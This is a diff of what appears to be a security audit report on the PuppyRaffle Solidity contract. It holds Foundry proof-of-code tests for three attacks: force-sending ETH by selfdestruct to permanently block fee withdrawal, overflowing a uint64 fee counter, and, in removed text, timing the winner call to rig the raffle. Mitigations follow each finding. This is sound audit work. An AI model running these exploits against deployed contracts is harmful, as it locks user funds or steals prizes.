 function withdrawFees() external {
     require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
@@ -427,56 +461,59 @@ function withdrawFees() external {
     require(success, "PuppyRaffle: Failed to withdraw fees");
 }
 
-An attacker can force-send ETH via selfdestruct to make the contract balance greater than totalFees, causing the equality check to fail permanently.
+An attacker can force-send 1 wei to the contract; then balance > totalFees and the equality check will always fail even when there are no active players.
 
 ## Impact
-Because anyone can force-send a single wei, the strict equality guard in withdrawFees() will never pass again. All ETH already collected as fees – plus every fee accrued in all future raffle rounds – becomes unrecoverable, permanently bricking the protocol’s revenue stream.
+Permanent DoS of fee withdrawal; protocol revenue stuck in the contract. Forced ETH can be sent without consent, bricking withdrawals.
 
 ## Proof of Concept
-1) Run a normal round to accumulate fees.
-2) Before withdrawFees() is called, attacker selfdestructs a contract sending 1 wei to PuppyRaffle.
-3) address(this).balance > totalFees. withdrawFees() reverts forever with "There are currently players active!".
+1) Let a round finish so fees accrue and players array is cleared.
+2) Attacker deploys a helper that self-destructs to the PuppyRaffle address sending 1 wei.
+3) Now address(this).balance = totalFees + 1 wei.
+4) Any call to withdrawFees reverts due to strict equality check, permanently locking fees.
 
 ## Proof of Code
-pragma solidity ^0.8.19;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import "src/PuppyRaffle.sol";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
 
 contract ForceSend {
-    function boom(address payable to) external payable {
+    function force(address payable to) external payable {
         selfdestruct(to);
     }
 }
 
-contract ForcedEthDoSTest is Test {
+contract UnexpectedEthTest is Test {
     PuppyRaffle raffle;
-    address feeAddr = address(0xFEe);
+    ForceSend forcer;
+
+    address p1 = address(0xA1);
+    address p2 = address(0xA2);
+    address p3 = address(0xA3);
+    address p4 = address(0xA4);
 
     function setUp() public {
-        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
-        // 4 players enter
-        for (uint160 i = 1; i <= 4; i++) {
-            address p = address(i);
-            vm.deal(p, 1 ether);
-            address[] memory arr = new address[](1);
-            arr[0] = p;
-            vm.prank(p);
-            raffle.enterRaffle{value: 1 ether}(arr);
-        }
-        vm.warp(block.timestamp + 1 days + 1);
-        vm.difficulty(1);
-        // Select a winner so players are cleared and fees accrued
-        vm.prank(address(0xBEEF));
-        raffle.selectWinner();
+        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
+        forcer = new ForceSend();
+        deal(address(this), 100 ether);
+
+        address[] memory entrants = new address[](4);
+        entrants[0] = p1; entrants[1] = p2; entrants[2] = p3; entrants[3] = p4;
+        raffle.enterRaffle{value: 4 ether}(entrants);
+
+        vm.warp(block.timestamp + 2);
     }
 
-    function testForcedEthBreaksWithdrawFees() public {
-        // Force send 1 wei to the raffle
-        ForceSend fs = new ForceSend();
-        vm.deal(address(fs), 1);
-        fs.boom{value: 1}(payable(address(raffle)));
-        // Now withdrawFees should revert due to strict equality check
+    function testWithdrawFeesStuckOnForcedEth() public {
+        // complete a round to accrue 0.8 ether in fees
+        raffle.selectWinner();
+
+        // force-send 1 wei, breaking the equality invariant
+        deal(address(forcer), 1 wei);
+        forcer.force{value: 1 wei}(payable(address(raffle)));
+
+        // now withdraw should revert even though there are no active players
         vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
         raffle.withdrawFees();
     }
@@ -484,102 +521,90 @@ contract ForcedEthDoSTest is Test {
 
 
 ## Suggested Mitigation
-- Do not rely on address(this).balance == totalFees to infer absence of active players.
-- Track active player count/escrowed deposits explicitly and use that to gate withdrawals (e.g., require(activePlayers == 0)).
-- Alternatively, withdraw exactly totalFees regardless of additional balance and maintain a separate accounting balance for fees vs. player deposits:
+Do not use strict balance equality as a proxy for "no active players". Track active player count or a round state variable, and allow withdraw when there are zero active players. Additionally, tolerate unexpected ETH by checking balance >= totalFees instead of ==.
 
-require(activePlayers == 0, "players active");
+Example:
+
+require(_activePlayers == 0, "players active");
 uint256 feesToWithdraw = totalFees;
+require(address(this).balance >= feesToWithdraw, "insufficient balance");
 totalFees = 0;
 (bool ok,) = feeAddress.call{value: feesToWithdraw}("");
 require(ok, "withdraw failed");
 
-
-
-# Medium Risk Findings
-
-## [M-1]. Randomness issue in PuppyRaffle::selectWinner
+## [M-4]. Integer Overflow issue in PuppyRaffle::selectWinner
 
 ## Description
-Predictable and manipulable randomness for winner selection and NFT rarity. The RNG uses only msg.sender, block.timestamp, and block.difficulty. Callers can choose msg.sender and when to call (timestamp), and validators can influence block.difficulty (prevrandao), enabling outcome manipulation and MEV.
+totalFees is a uint64 while fee calculations use uint256 arithmetic and can exceed 2^64-1 across rounds. The cast and accumulation can overflow/underflow silently in Solidity 0.7.x, corrupting accounting and breaking withdrawals. Vulnerable snippet:
 
-Vulnerable code snippet:
+uint256 fee = (totalAmountCollected * 20) / 100;
+// ...
+totalFees = totalFees + uint64(fee); // uint64 accumulation silently wraps on overflow
 
-uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
-...
-uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
-
-Anyone can call selectWinner() and choose a favorable time/address to skew winnerIndex; validators can also skew rarity via prevrandao (block.difficulty on PoS).
+Combined with withdrawFees strict equality, overflowed totalFees will desync from actual balance and brick withdrawals.
 
 ## Impact
-Because the winner selection and rarity calculations rely only on values that either (1) the transaction sender fully controls (msg.sender), or (2) a block producer can influence (block.timestamp, block.difficulty == prevrandao), the draw is not cryptographically random. A searcher can increase their expected winning probability by submitting multiple selectWinner() transactions from different addresses in the same block and letting the builder keep only the transaction that makes them winner (MEV "transaction stuffing"). A validator / builder that decides the final prevrandao can bias both the winner and the NFT rarity outright. This breaks the economic fairness promised to players and can divert a large portion of the pooled ETH and rare NFTs to the manipulator.
+Fee accounting corruption. After enough rounds (e.g., 24 rounds at 1 ETH entrance with 4 players per round), totalFees overflows uint64, causing withdrawFees to permanently revert and trapping protocol revenue.
 
 ## Proof of Concept
-Scenario A – Searcher front-runs with many candidate calls
-1. Raffle has ended (raffleDuration passed) and ≥4 players are registered, including several addresses controlled by the attacker (addr1 … addrN).
-2. Off-chain, the attacker computes for each owned address `i` the value `winnerIndex_i = keccak256(addr_i, t, d) % players.length`, leaving `t` and `d` unknown.
-3. The attacker builds M transactions that each call selectWinner() from a different address (addr1 … addrM) and sends them **with the same gas price** to the mempool right after the raffle closed.
-4. A sophisticated MEV relay / builder keeps these transactions in a private bundle. When the block is being built the builder knows the final `prevrandao` (what block.difficulty returns) and block.timestamp, so it can evaluate which of the M transactions makes its address the winner.
-5. Only that profitable transaction is kept in the bundle; the others are discarded. The attacker therefore appears once in the block and wins with much higher probability than 1/players.length.
-
-Scenario B – Validator control
-A validator that produces the block can simply choose the block’s prevrandao value (within the allowed BLS-based randomness) after observing the single selectWinner() call already placed in the block. They iterate until the hash maps to their own index or until the rarity hash yields a legendary puppy, then finalise the block, guaranteeing the desired outcome.
-
-Either path demonstrates that the "randomness" can be biased without needing impossible abilities such as setting timestamp or difficulty directly from a normal account.
+1) Run ~24 raffle rounds with 4 players and 1 ETH entrance fee.
+2) Each round accrues 0.8 ETH in fees. Sum exceeds 2^64-1 wei after ~24 rounds.
+3) totalFees wraps around (uint64 overflow) while contract balance holds correct sum.
+4) withdrawFees reverts due to address(this).balance != totalFees.
 
 ## Proof of Code
-pragma solidity ^0.8.19;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import "src/PuppyRaffle.sol";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
 
-contract RandomnessManipulationTest is Test {
+contract TotalFeesOverflowTest is Test {
     PuppyRaffle raffle;
-    address feeAddr = address(0xFEe);
+    address p1 = address(0xA1);
+    address p2 = address(0xA2);
+    address p3 = address(0xA3);
+    address p4 = address(0xA4);
 
     function setUp() public {
-        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);
-        // Add 4 players including attacker
-        address attacker = address(0xA11CE);
-        address[3] memory others = [address(0xBEEF), address(0xCAFE), address(0xD00D)];
-        // fund
-        vm.deal(attacker, 1 ether);
-        for (uint256 i = 0; i < 3; i++) vm.deal(others[i], 1 ether);
-        // enter all
-        address[] memory arr = new address[](1);
-        arr[0] = attacker; vm.prank(attacker); raffle.enterRaffle{value: 1 ether}(arr);
-        for (uint256 i = 0; i < 3; i++) { arr[0] = others[i]; vm.prank(others[i]); raffle.enterRaffle{value: 1 ether}(arr); }
-        // advance time
-        vm.warp(block.timestamp + 1 days + 1);
-        vm.difficulty(1); // set known difficulty
+        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
+        deal(address(this), 1_000 ether);
     }
 
-    function computeIndex(address caller, uint256 ts, uint256 diff, uint256 N) internal pure returns (uint256) {
-        return uint256(keccak256(abi.encodePacked(caller, ts, diff))) % N;
+    function _enterFour() internal {
+        address[] memory entrants = new address[](4);
+        entrants[0] = p1; entrants[1] = p2; entrants[2] = p3; entrants[3] = p4;
+        raffle.enterRaffle{value: 4 ether}(entrants);
     }
 
-    function testAttackerPicksWinningTimestamp() public {
-        address attacker = address(0xA11CE);
-        uint256 targetIndex = 0; // attacker entered first -> index 0
-        uint256 chosenTs = 0;
-        uint256 N = 4;
-        for (uint256 t = block.timestamp; t < block.timestamp + 10000; t++) {
-            if (computeIndex(attacker, t, 1, N) == targetIndex) { chosenTs = t; break; }
+    function testUint64OverflowLocksFees() public {
+        uint256 rounds = 25; // enough to overflow uint64 with 0.8 ETH per round
+        for (uint256 i = 0; i < rounds; i++) {
+            _enterFour();
+            vm.warp(block.timestamp + 2);
+            raffle.selectWinner();
         }
-        assertTrue(chosenTs != 0, "no timestamp found in search window");
-        vm.warp(chosenTs);
-        // Attacker calls selectWinner and should be chosen
-        vm.prank(attacker);
-        raffle.selectWinner();
-        assertEq(raffle.previousWinner(), attacker, "attacker forced themselves as winner by timing the call");
+        // Expected fee balance in contract
+        uint256 expectedFees = rounds * ((4 ether * 20) / 100); // rounds * 0.8 ether
+        assertEq(address(raffle).balance, expectedFees, "contract holds full fees");
+
+        // totalFees is uint64 and must have overflowed; inequality proves desync
+        uint256 storedFees = uint256(raffle.totalFees());
+        assertTrue(storedFees != expectedFees, "uint64 overflow corrupted totalFees");
+
+        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
+        raffle.withdrawFees();
     }
 }
 
 
 ## Suggested Mitigation
-- Use a verifiable randomness source such as Chainlink VRF.
-- Alternatively, use a commit-reveal scheme where the entropy includes values not known at the time of commitment, e.g., future blockhash, and prevent same-block influence.
-- Do not let msg.sender directly influence entropy; require a two-step process or use an authorized randomness coordinator.
+Use uint256 for totalFees and SafeMath (for Solidity 0.7.x) or upgrade to Solidity >=0.8 with built-in overflow checks. Avoid lossy casts. Example:
+
+using SafeMath for uint256;
+uint256 public totalFees;
+...
+uint256 fee = totalAmountCollected.mul(20).div(100);
+totalFees = totalFees.add(fee);
 
 
 
